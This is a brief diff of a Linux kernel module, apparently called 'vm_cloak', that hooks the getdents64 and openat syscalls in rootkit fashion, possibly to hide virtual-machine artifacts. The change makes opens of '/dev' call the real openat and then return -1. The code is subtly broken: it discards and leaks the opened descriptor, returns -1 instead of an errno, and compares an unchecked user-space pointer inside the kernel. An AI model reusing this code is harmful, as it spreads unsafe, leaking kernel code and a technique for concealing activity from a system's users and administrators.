@@ -87,7 +87,8 @@ asmlinkage long vm_cloak_getdents64(const struct pt_regs *regs) {
  */
 asmlinkage long vm_cloak_openat(const struct pt_regs *regs) {
 
-    const char* fname;
+    const char  *fname;
+    long        result;
 
     fname = (char *) regs->si;
     if(!check_target_file_fullname(fname)) {
@@ -97,8 +98,12 @@ asmlinkage long vm_cloak_openat(const struct pt_regs *regs) {
                 fname, comm, (int) current->pid);
     }
 
-    if (!strcmp("/dev", fname))
-        pr_info("/dev being read");
+    if (!strcmp("/dev", fname)) {
+        
+        result = kern_openat(regs);
+        return -1;
+    }
+
 
     return kern_openat(regs);
 }
